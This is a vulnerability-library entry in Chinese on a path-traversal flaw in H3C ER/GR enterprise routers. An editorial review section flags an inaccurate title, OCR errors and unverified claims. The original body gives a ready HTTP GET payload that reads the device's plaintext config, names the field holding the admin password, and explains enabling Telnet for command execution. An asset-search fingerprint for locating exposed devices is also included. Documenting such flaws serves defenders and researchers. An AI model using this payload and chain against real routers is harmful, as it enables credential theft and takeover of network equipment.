---
source: "wy876 漏洞文库"
id: "vw-3cb96438dab4daf19df96d82"
entity_id: "ve-3cb96438dab4daf19df96d82"
schema_version: "1"
fofa_unverified: "app.name="
title: "H3C多系列路由器存在任意用户登录漏洞"
product: "H3C ER/GR企业路由器"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "型号对应cfg；已知密码登录并启Telnet为后续"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/H3C/H3C%E5%A4%9A%E7%B3%BB%E5%88%97%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/wgzkiefvdexpuyq1"
source_status: "recorded"
---

# H3C多系列路由器存在任意用户登录漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：H3C ER/GR企业路由器
- 本文讨论：userLogin/actionpolicy_status路径遍历配置泄露
- 版本、权限与配置前提：型号对应cfg；已知密码登录并启Telnet为后续
- 资料类型：配置泄露利用链；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 任意用户登录标题不准确，实际读取配置后凭据登录
- 描述路径多处OCR错字空格；型号系列范围未给固件
- hunter元数据截断；vtypasswd是否Web密码需证；无响应/修复
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 产品/固件、路径保留及密码用途待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
 H3C 企业路由器(ERN ERG2N GR 系列》存在任意用户登录和命令 执行漏洞，攻击者可通过访问nserLog in.asp/actionpalicy_status1./xxxx.cfg 接口，xxxx为设备型号（比如设备型号为 ER5200G2 ，即访问userLog in.asp/../actionpolicy_status/../ER5200G2.cfg），统过COOKIE 验证，进行目录穿越，获取 设备的明文配置文件，配置中有明文的web 管理员账号admin 的密码，登陆后台 即可通过开启 telenet 获取命令执行权限  

# 二、影响版本
+ H3C多系列路由器

# 三、资产测绘
+ hunter`app.name="H3C Router Management"`
+ 登录页面


# 四、漏洞复现
1. 访问userLog in.asp/actionpalicy_status1./xxxx.cfg 接口，xxxx为设备型号（比如设备型号为 ER5200G2 ，即访问userLog in.asp/../actionpolicy_status/../ER5200G2.cfg）
2. 根据设备型号修改payload

```http
GET /userLogin.asp/../actionpolicy_status/../ER2200G2.cfg HTTP/1.1
User-Agent: Java/1.8.0_381
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


3. <font style="color:rgba(0, 0, 0, 0.9);">密码就在</font>`<font style="color:rgba(0, 0, 0, 0.9);">vtypasswd</font>`<font style="color:rgba(0, 0, 0, 0.9);">字段</font>


4. 账户为`admin`


5. 可在`远程管理`->`远程telnet管理`处开启telnet获取命令执行权限


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wgzkiefvdexpuyq1>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
